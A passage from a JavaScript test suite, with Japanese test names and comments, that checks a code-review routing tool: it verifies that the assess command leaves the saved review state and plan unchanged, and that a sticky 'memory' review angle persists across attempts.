  assert.deepEqual(result.selection.escalatedAngles, ['adversarial']);
  assert.deepEqual(result.selection.conditionalAngles, ['memory']);

  const after = readFileSync(stateFile(dir), 'utf-8');
  assert.equal(after, before, 'assessCommand は review-state.json を一切書き換えない');
});

test('assessCommand: memory sticky — 直前 attempt で memoryRequired=true になっていれば今回 --memory-hits 0 でも conditionalAngles に memory が残る（risk-model 検証所見・§14 T）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const snap = latestSnapshot(dir);

  const state = emptyState();
  state.initialTier = 'Light';
  state.effectiveTier = 'Light';
  // 1 round 目相当: --memory-hits 2 が actual 側の memoryRequired を sticky にした状態を模す
  state.memoryRequired = true;
  saveState(state, dir);

  const assessment = assessmentFixture(snap.snapshotId);
  // 2 round 目相当: --memory-hits を渡さない（0）
  const result = assessCommand({ cwd: dir, snap, assessment, memoryHits: 0 });

  assert.equal(result.valid, true);
  assert.deepEqual(
    result.selection.conditionalAngles,
    ['memory'],
    'state.memoryRequired が sticky な間は今回のヒット0件だけで conditionalAngles から memory が消えてはならない',
  );
});

test('actual plan は shadow assess 呼び出しの前後で不変（同一 state からの再計算が一致する）', (t) => {
  const dir = makeRepo();
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  write(dir, 'src/feature.js', 'export const b = 2;\n');
  sh(dir, ['add', '.']);
  sh(dir, ['commit', '-qm', 'feature']);
  createSnapshot({ cwd: dir, baseRef: 'main' });
  const snap = latestSnapshot(dir);

  const state1 = emptyState();
  const plan1 = planCommand(state1, snap, {});
  saveState(state1, dir);

  // shadow: valid / invalid の両方を試す（review-plan.json には一切触れない別ファイルへ出力）
  assessCommand({ cwd: dir, snap, assessment: assessmentFixture(snap.snapshotId) });
  assessCommand({ cwd: dir, snap, assessment: assessmentFixture('wrong-snapshot-id') });
  const shadowOutPath = join(snap.dir, 'shadow-routing.json');
  // このテストは CLI 経由ではなく assessCommand を直接呼ぶため、まだファイルは書かれていない
  assert.equal(existsSync(shadowOutPath), false);

  const state2 = emptyState();
  const plan2 = planCommand(state2, snap, {});
  assert.deepEqual(plan2, plan1, 'shadow assess の呼び出しは actual review plan を変えない');
});
